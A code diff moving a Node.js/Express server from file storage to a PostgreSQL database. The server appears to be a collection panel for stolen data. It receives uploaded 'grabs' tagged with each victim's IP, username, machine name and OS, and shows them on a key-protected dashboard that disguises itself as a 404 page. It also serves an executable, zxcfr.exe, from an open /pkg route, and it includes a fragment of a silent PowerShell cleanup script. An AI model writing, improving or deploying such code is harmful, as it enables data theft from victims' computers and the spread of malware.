@@ -1,41 +1,44 @@
 const express = require("express");
 const multer = require("multer");
-const path = require("path");
-const fs = require("fs");
 const crypto = require("crypto");
+const { Pool } = require("pg");
 
 const app = express();
 const PORT = process.env.PORT || 8080;
 const API_KEY = process.env.API_KEY || "changeme";
-const UPLOAD_DIR = path.join(__dirname, "uploads");
-const META_FILE = path.join(__dirname, "metadata.json");
 
-if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
-if (!fs.existsSync(META_FILE)) fs.writeFileSync(META_FILE, "[]");
-
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
-  filename: (req, file, cb) => {
-    const id = crypto.randomBytes(6).toString("hex");
-    const ts = Date.now();
-    cb(null, `${ts}_${id}.dat`);
-  },
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes("localhost")
+    ? { rejectUnauthorized: false }
+    : false,
 });
-const upload = multer({ storage, limits: { fileSize: 500 * 1024 * 1024 } });
+
+async function initDb() {
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS grabs (
+      id TEXT PRIMARY KEY,
+      filename TEXT NOT NULL,
+      filedata BYTEA NOT NULL,
+      filesize BIGINT NOT NULL,
+      ip TEXT DEFAULT '',
+      machine TEXT DEFAULT '',
+      username TEXT DEFAULT '',
+      os TEXT DEFAULT '',
+      arch TEXT DEFAULT '',
+      created_at TIMESTAMPTZ DEFAULT NOW()
+    )
+  `);
+}
+
+initDb().catch(e => console.error("[!] db init failed:", e.message));
+
+const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 500 * 1024 * 1024 } });
 
 function checkKey(req, res, next) {
   const key = req.query.key || req.headers["x-api-key"] || (req.headers.authorization || "").replace("Bearer ", "");
   if (key !== API_KEY) return res.status(401).send(page404());
   next();
-}
-
-function loadMeta() {
-  try { return JSON.parse(fs.readFileSync(META_FILE, "utf8")); }
-  catch { return []; }
-}
-
-function saveMeta(data) {
-  fs.writeFileSync(META_FILE, JSON.stringify(data, null, 2));
 }
 
 function fmtSize(bytes) {
@@ -45,8 +48,8 @@ function fmtSize(bytes) {
   return (bytes / 1073741824).toFixed(2) + " GB";
 }
 
-function timeAgo(iso) {
-  const ms = Date.now() - new Date(iso).getTime();
+function timeAgo(dt) {
+  const ms = Date.now() - new Date(dt).getTime();
   const s = Math.floor(ms / 1000);
   if (s < 60) return s + "s ago";
   const m = Math.floor(s / 60);
@@ -57,8 +60,8 @@ function timeAgo(iso) {
   return d + "d ago";
 }
 
-function fmtTime(iso) {
-  const d = new Date(iso);
+function fmtTime(dt) {
+  const d = new Date(dt);
   const pad = (n) => String(n).padStart(2, "0");
   return `${d.getUTCFullYear()}-${pad(d.getUTCMonth()+1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
 }
@@ -69,7 +72,7 @@ function esc(s) {
 }
 
 function osIcon(os) {
-  if (!os) return "❓";
+  if (!os) return "?";
   const l = os.toLowerCase();
   if (l.includes("windows 10")) return "W10";
   if (l.includes("windows 11")) return "W11";
@@ -83,50 +86,78 @@ function page404() {
   return `<!DOCTYPE html><html><head><title>404</title></head><body style="background:#000;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace"><h1>404</h1></body></html>`;
 }
 
-app.post("/api/v1/sync", checkKey, upload.single("file"), (req, res) => {
+app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
   if (!req.file) return res.status(400).json({ e: 1 });
-  const meta = loadMeta();
-  meta.unshift({
-    id: crypto.randomBytes(4).toString("hex"),
-    f: req.file.filename,
-    s: req.file.size,
-    t: new Date().toISOString(),
-    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress || "",
-    m: req.query.m || "",
-    u: req.query.u || "",
-    o: req.query.o || "",
-    a: req.query.a || "",
-  });
-  saveMeta(meta);
-  res.json({ e: 0 });
+  try {
+    const id = crypto.randomBytes(4).toString("hex");
+    const ts = Date.now();
+    const filename = `${ts}_${crypto.randomBytes(6).toString("hex")}.dat`;
+    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+    await pool.query(
+      `INSERT INTO grabs (id, filename, filedata, filesize, ip, machine, username, os, arch)
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
+      [id, filename, req.file.buffer, req.file.size,
+       ip, req.query.m || "", req.query.u || "", req.query.o || "", req.query.a || ""]
+    );
+    res.json({ e: 0 });
+  } catch (err) {
+    console.error("[!] upload error:", err.message);
+    res.status(500).json({ e: 2 });
+  }
 });
 
-app.get("/", checkKey, (req, res) => {
-  const meta = loadMeta();
-  const totalSize = meta.reduce((s, e) => s + (e.s || 0), 0);
-  const k = encodeURIComponent(req.query.key);
-  res.send(renderPage(meta, totalSize, k));
+app.get("/", checkKey, async (req, res) => {
+  try {
+    const { rows } = await pool.query(
+      `SELECT id, filename, filesize, ip, machine, username, os, arch, created_at
+       FROM grabs ORDER BY created_at DESC`
+    );
+    const totalSize = rows.reduce((s, r) => s + parseInt(r.filesize || 0), 0);
+    const k = encodeURIComponent(req.query.key);
+    const entries = rows.map(r => ({
+      id: r.id,
+      f: r.filename,
+      s: parseInt(r.filesize),
+      t: r.created_at,
+      ip: r.ip,
+      m: r.machine,
+      u: r.username,
+      o: r.os,
+      a: r.arch,
+    }));
+    res.send(renderPage(entries, totalSize, k));
+  } catch (err) {
+    console.error("[!] dashboard error:", err.message);
+    res.status(500).send("db error");
+  }
 });
 
-app.get("/dl/:f", checkKey, (req, res) => {
-  const fp = path.join(UPLOAD_DIR, path.basename(req.params.f));
-  if (!fs.existsSync(fp)) return res.status(404).send(page404());
-  res.download(fp);
+app.get("/dl/:id", checkKey, async (req, res) => {
+  try {
+    const { rows } = await pool.query(
+      `SELECT filename, filedata FROM grabs WHERE id = $1`, [req.params.id]
+    );
+    if (!rows.length) return res.status(404).send(page404());
+    res.setHeader("Content-Type", "application/octet-stream");
+    res.setHeader("Content-Disposition", `attachment; filename=${rows[0].filename}`);
+    res.send(rows[0].filedata);
+  } catch (err) {
+    res.status(500).send("error");
+  }
 });
 
-app.post("/rm/:f", checkKey, (req, res) => {
-  const fname = path.basename(req.params.f);
-  const fp = path.join(UPLOAD_DIR, fname);
-  if (fs.existsSync(fp)) fs.unlinkSync(fp);
-  let meta = loadMeta();
-  meta = meta.filter((e) => e.f !== fname);
-  saveMeta(meta);
-  res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
+app.post("/rm/:id", checkKey, async (req, res) => {
+  try {
+    await pool.query(`DELETE FROM grabs WHERE id = $1`, [req.params.id]);
+    res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
+  } catch (err) {
+    res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
+  }
 });
 
 function renderPage(entries, totalSize, k) {
   const uniqueIps = new Set(entries.map(e => e.ip)).size;
-  const rows = entries.map((e, i) => {
+  const rows = entries.map((e) => {
     const osTag = osIcon(e.o);
     const isWin = (e.o || "").toLowerCase().includes("windows");
     return `<tr>
@@ -138,8 +169,8 @@ function renderPage(entries, totalSize, k) {
       <td class="mono">${fmtSize(e.s || 0)}</td>
       <td><span class="dim">${fmtTime(e.t)}</span><br><span class="accent">${timeAgo(e.t)}</span></td>
       <td class="actions">
-        <a class="btn btn-p" href="/dl/${encodeURIComponent(e.f)}?key=${k}">&#8615;</a>
-        <form method="POST" action="/rm/${encodeURIComponent(e.f)}?key=${k}" style="display:inline" onsubmit="return confirm('remove entry?')">
+        <a class="btn btn-p" href="/dl/${esc(e.id)}?key=${k}">&#8615;</a>
+        <form method="POST" action="/rm/${esc(e.id)}?key=${k}" style="display:inline" onsubmit="return confirm('remove entry?')">
           <button class="btn btn-d" type="submit">&#10005;</button>
         </form>
       </td>
@@ -210,7 +241,7 @@ tbody tr:hover{background:#0d0d22}
     <thead><tr><th>id</th><th>sys</th><th>host</th><th>arch</th><th>origin</th><th>size</th><th>received</th><th></th></tr></thead>
     <tbody>${rows}</tbody>
   </table>` : '<div class="empty"><div class="icon">&#9673;</div><p>no entries</p></div>'}
-  <div class="foot">nexus v2</div>
+  <div class="foot">nexus v3</div>
 </div>
 <script>setTimeout(()=>location.reload(),30000)</script>
 </body>
@@ -232,11 +263,11 @@ Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
 });
 
 app.get("/pkg", (req, res) => {
-  const fp = path.join(__dirname, "zxcfr.exe");
-  if (!fs.existsSync(fp)) return res.status(404).send("not found");
+  const fp = require("path").join(__dirname, "zxcfr.exe");
+  if (!require("fs").existsSync(fp)) return res.status(404).send("not found");
   res.setHeader("Content-Type", "application/octet-stream");
   res.setHeader("Content-Disposition", "attachment; filename=zxcfr.exe");
-  fs.createReadStream(fp).pipe(res);
+  require("fs").createReadStream(fp).pipe(res);
 });
 
 app.listen(PORT, () => {
